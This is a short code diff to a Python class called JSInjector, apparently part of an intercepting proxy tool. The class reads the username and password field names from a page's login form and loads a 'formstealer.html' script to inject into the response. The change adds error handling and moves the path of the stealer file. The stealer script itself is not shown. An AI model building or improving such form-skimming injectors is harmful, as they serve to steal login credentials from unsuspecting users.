@@ -63,12 +63,14 @@ class JSInjector:
 
         # Get the name of the form
 
+        try:
+            for elem1 in txtinput:
+                username = elem1['name']
 
-        for elem1 in txtinput:
-            username = elem1['name']
-
-        for elem2 in pwdinput:
-            password = elem2['name']
+            for elem2 in pwdinput:
+                password = elem2['name']
+        except Exception:
+            return oldresponse
 
 
         if username is "" or password is "":
@@ -79,7 +81,7 @@ class JSInjector:
 
         #Get formstealer script
         script = ""
-        with open("MultiProxyTool/formstealer.html", 'r') as f:
+        with open("JSInjector/formstealer.html", 'r') as f:
             script = f.readlines()
 
         if len(script) is 0:
